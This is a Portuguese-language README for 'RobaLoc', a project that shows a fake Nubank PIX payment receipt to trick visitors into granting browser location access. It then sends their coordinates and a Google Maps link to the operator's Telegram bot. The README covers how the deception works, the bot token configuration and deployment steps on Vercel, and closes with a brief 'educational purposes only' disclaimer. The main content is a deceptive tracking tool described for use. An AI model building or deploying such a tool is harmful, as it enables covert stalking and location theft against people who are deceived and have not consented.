# RobaLoc

Um projeto que simula um comprovante de pagamento via PIX, mas que na verdade coleta e envia a localização do usuário via Telegram.

## Funcionalidades

- Exibe uma página falsa de comprovante de transferência Pix do Nubank
- Solicita permissão de localização do navegador do usuário
- Envia as coordenadas de geolocalização para um bot do Telegram
- Inclui link do Google Maps para visualização fácil da localização

## Tecnologias Utilizadas

- **Node.js (Serverless na Vercel)** - Função para receber e enviar localização
- **HTML/CSS** - Frontend que simula o comprovante de pagamento
- **JavaScript** - Coleta dados de geolocalização do navegador
- **API Telegram** - Envio de mensagens com a localização do usuário

## Como Funciona

1. O usuário acessa o site que parece um comprovante de pagamento do Nubank
2. O navegador solicita permissão para acessar a localização
3. Quando o usuário permite, o JavaScript captura as coordenadas
4. Os dados são enviados para o endpoint `/api/send_location` (Node.js Serverless)
5. O backend envia uma mensagem pelo Telegram com a localização exata

## Configuração

O projeto utiliza as seguintes variáveis para configuração (em `api/send_location.js`):

```js
const TELEGRAM_BOT_TOKEN = 'seu_token_aqui';
const TELEGRAM_CHAT_ID = 'seu_chat_id_aqui';
```

## Implantação na Vercel

1. Instale a CLI da Vercel:
   ```bash
   npm install -g vercel
   ```
2. Faça login:
   ```bash
   vercel login
   ```
3. Importe o projeto para a Vercel ou rode:
   ```bash
   vercel --prod
   ```

A Vercel irá detectar automaticamente a configuração e disponibilizar o site com HTTPS.

---

**⚠️ AVISO**: Este projeto foi criado apenas para fins educacionais. O uso desta ferramenta para enganar pessoas ou coletar dados sem consentimento pode ser ilegal em muitas jurisdições.
Espero que tenha sido util!
